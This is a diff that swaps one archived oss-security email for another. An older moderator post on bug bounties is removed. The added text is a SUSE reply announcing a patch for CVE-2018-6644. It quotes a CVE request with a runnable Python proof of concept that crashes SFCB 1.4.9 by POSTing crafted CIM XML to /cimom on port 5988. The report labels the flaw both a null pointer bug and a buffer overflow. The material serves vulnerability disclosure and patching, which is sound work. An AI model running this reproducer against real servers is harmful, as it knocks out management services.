@@ -1,73 +1,153 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/09/25/2
-Message-ID: <20180925135744.GA16717@openwall.com>
-Date: Tue, 25 Sep 2018 15:57:44 +0200
-From: Solar Designer <solar@...nwall.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/02/09/2
+Message-ID: <20180209093444.vkebhw75m53ucd4n@suse.de>
+Date: Fri, 9 Feb 2018 10:34:44 +0100
+From: Marcus Meissner <meissner@...e.de>
 To: oss-security@...ts.openwall.com
-Subject: Re: bounties
+Subject: Re: Fw:Re: [scr459004] sfcb - 1.4.9
 Content-Type: text/plain; charset=utf-8
 
 Hi,
 
-Moderator hat on:
+Patch from our sblim-sfcb maintainer Adam Majer to fix this issue is attached.
 
-I'm sorry for the delay in the moderation decision on this one message.
-We overlooked it at first for its spam-like Subject, only noticing what
-it actually was when follow-ups started arriving today.
+Ciao, Marcus
 
-I am unhappy about the cross-post (this is against the published
-oss-security guidelines, but it sometimes happens anyway), even though
-this is what ultimately enabled the non-spam detection in this case.
+On Wed, Feb 07, 2018 at 01:04:18PM +0800, XinleiHe wrote:
+> 
+> 
+> 
+> 
+> 
+> 
+> 
+> 
+> 
+> 
+> -------- Forwarding messages --------
+> From: cve-request@...re.org
+> Date: 2018-02-06 04:11:55
+> To:  hxl1999@...h.net
+> Cc:  cve-request@...re.org
+> Subject: Re: [scr459004] sfcb - 1.4.9
+> -----BEGIN PGP SIGNED MESSAGE-----
+> Hash: SHA256
+> 
+> The CVE ID is below. Please inform the software maintainer that the
+> CVE ID has been assigned.
+> 
+> 
+> > [Suggested description]
+> > SBLIM Small Footprint CIM Broker (SFCB) 1.4.9 has a
+> > null pointer (DoS) vulnerability via
+> > a crafted POST request to the /cimom URI.
+> > 
+> > ------------------------------------------
+> > 
+> > [Additional Information]
+> > You can use following python code to reproduce this vulnerability.
+> > 
+> > import httplib
+> > from xml.dom.minidom import Document
+> > class write_xml(Document):
+> >     def __init__(self):
+> > 
+> >         Document.__init__(self)
+> >  
+> >     def set_tag(self,tag):
+> >         self.tag = tag
+> >         self.cim = self.createElement(self.tag)
+> >         #self.setAttribute("encoding", "utf-8")
+> >         
+> >         self.cim.setAttribute("CIMVERSION", "2.0")
+> >         self.cim.setAttribute("DTDVERSION", "2.0")
+> >         self.appendChild(self.cim)
+> > 
+> >         self.msg = self.createElement("MESSAGE")
+> >         self.msg.setAttribute("ID", "4711")
+> >         self.msg.setAttribute("PROTOCOLVERSION","1.0")
+> >         self.cim.appendChild(self.msg)
+> > 
+> >         self.sim = self.createElement("SIMPLEREQ")
+> >         self.msg.appendChild(self.sim)
+> > 
+> >         self.ime = self.createElement("IMETHODCALL")
+> >         self.ime.setAttribute("NAME","EnumerateInstances")
+> >         self.sim.appendChild(self.ime)
+> > 
+> >         self.local = self.createElement("LOCALNAMESPACEPATH")
+> >         self.ime.appendChild(self.local)
+> >           
+> >         self.names1=self.createElement("NAMESPACE")
+> >         self.names1.setAttribute("NAME", "root")
+> >         self.local.appendChild(self.names1)
+> > 
+> >     def display(self):
+> >         print self.toprettyxml(indent="   ")
+> >     def retdata(self):
+> >         return self.toprettyxml(indent="   ")
+> > 
+> > def httpreq(data):
+> >  conn = httplib.HTTPConnection("127.0.0.1", 5988, False)
+> >  conn.request('POST', '/cimom',data)
+> >  res = conn.getresponse() 
+> > 
+> > def main(): 
+> >  wx = write_xml()
+> >  wx.set_tag('CIM')
+> >  print wx.retdata()
+> >  print httpreq(wx.retdata())
+> > 
+> > if __name__=='__main__':
+> >  main()
+> > 
+> > ------------------------------------------
+> > 
+> > [Vulnerability Type]
+> > Buffer Overflow
+> > 
+> > ------------------------------------------
+> > 
+> > [Vendor of Product]
+> > SBLIM project
+> > 
+> > ------------------------------------------
+> > 
+> > [Affected Product Code Base]
+> > sfcb - 1.4.9
+> > 
+> > ------------------------------------------
+> > 
+> > [Impact Denial of Service]
+> > true
+> 
+> Use CVE-2018-6644.
+> 
+> 
+> - -- 
+> CVE Assignment Team
+> M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
+> [ A PGP key is available for encrypted communications at
+>   http://cve.mitre.org/cve/request_id.html ]
+> -----BEGIN PGP SIGNATURE-----
+> Version: GnuPG v1
+> 
+> iQIcBAEBCAAGBQJaeLorAAoJEHb/MwWLVhi2xdoP/2OaKyQzIatRABkB35IlzYpR
+> vkjtDA8uXjMIcnuJr/sYa/zVFjIBRFQ2nLRkJs2d5Ni1uNsZ3hGm5A7Tn3RFsEby
+> tL6CvtY8h0MBf4xf6ZVdkzwshJyb05qaOB7UfUL5Fskzoxvs2QpcbGKGtbtaKbPU
+> YZq4t6aIyZW9UMEwheeCBDzGqC/oLVRUxgztgAy8SIhIlVfwtYEmHvafs11cN2XV
+> EjVvIbaOeRlOfelJvlSKCOjHj0vjOesouiGlMLm3nqYXm5en/T66tuCpaajn4zzO
+> I/Wj0Fm8tm2w0pkdfcNBewLu7+4bjRsiJ8U0SVPFQaOENvK7C3q6NyrfCgs1qesR
+> fr4LS9TfOcuuIjxn9w3T0Hr4nOAJnSwTiwmnuKoQblA/Pn/r8CquyKh/Rh/ST6P7
+> YxLUt9ZzXKf2SlWV1q+68N9RvefoXQFgQdAP2eUG0Y2i8ACZmxCPVLMclwUHvYIG
+> KFlei2bIp4IADt3zRdndQBzEK1NwFhNwIKSnE7ybRQqFx6yTgoEiOP0CpYZLmRqi
+> g94pvunSBKqPcCNhW/C78orO0Tz7UegnkaBMNYgIgW/jCFEiFGSBgi4VIjW8WWrr
+> M+BM/UGehRBbGjmRqphsOBHdc1H9VKUAWJ0Y4hzQAd5Y6QCcTWb0uMlbNMjINshR
+> 4TNbCFPf5EWJy7Bw8Gic
+> =q5wy
+> -----END PGP SIGNATURE-----
 
-I am also unhappy about the lack of focus on Open Source (but not total
-lack of relation to Open Source, which is why the message is approved)
-in this message and in follow-ups we might receive via full-disclosure.
+-- 
+Marcus Meissner,SUSE LINUX GmbH; Maxfeldstrasse 5; D-90409 Nuernberg; Zi. 3.1-33,+49-911-740 53-432,,serv=loki,mail=wotan,type=real <meissner@...e.de>
 
-While the original message looks like something we'd need to approve
-despite of the above issues (so I did), I currently have no plans to
-approve any follow-ups we might receive via full-disclosure.  Currently
-in the moderation queue, and not expected to be approved, are a very
-brief reply by another person confirming Justin's criticism and giving a
-link to the person's Medium blog post (at first look, only tangentially
-related to Open Source - pertaining to proprietary products that use
-Open Source components), Justin's reply to the reply (a rant and no
-longer a question/request for other people's experience; also no mention
-of Open Source nor any specific software nor vendor at all), and
-Justin's out-of-context copying of a reply (repeatedly mentioning "rip
-off") to a who-knows-what vendor about a who-knows-what product (these
-things are not immediately clear from the message).  Even though not
-approved here, there's a chance we'll see those messages on
-full-disclosure, depending on that other list's moderators' decisions.
-
-So quite possibly the thread on oss-security will end here, unless
-someone will post something of greater relevance and/or higher quality
-than what's in those follow-ups I mentioned above.
-
-Personal hat on:
-
-On Fri, Sep 21, 2018 at 09:12:15PM -0700, Justin Ferguson wrote:
-> I was curious about peoples experiences with bug bounties particularly
-> those through the prominent clearing houses for them. My experience is
-> that I have been either ripped off or extremely slow-walked in payment
-> that was substantially below the listed payout in every single
-> instance. I'm curious how accurately that reflects other peoples
-> experiences.
-
-I have very little experience, in part because I've never been hunting
-for bug bounties.  I only recall receiving a bug bounty three times so
-far, from three different vendors.  In the first case, I didn't know the
-vendor had a bug bounty program (which was very uncommon at the time -
-1999).  In other two cases (in 2010s), I was aware of the bug bounty
-programs (and in one case went via HackerOne, as a test of that
-platform, which worked perfectly) but the issues I was submitting were
-clearly beyond scope, yet I was paid the bounties anyway.  The amounts
-were moderate, but it was very kind of those vendors to offer anything
-at all.  So no complaints from me.
-
-I do hear that others have all sorts of different experience.  There's
-also criticism from many vendors about the behavior of bug reporters.
-Once a vendor offers a bug bounty, they commonly receive lots of crappy
-reports, accusations, etc.  Unfortunately.  (Yet by saying this I don't
-mean to defend any vendor not honoring their bug bounty terms.)
-
-Alexander
+View attachment "set_default_content_type.patch" of type "text/x-patch" (2190 bytes)
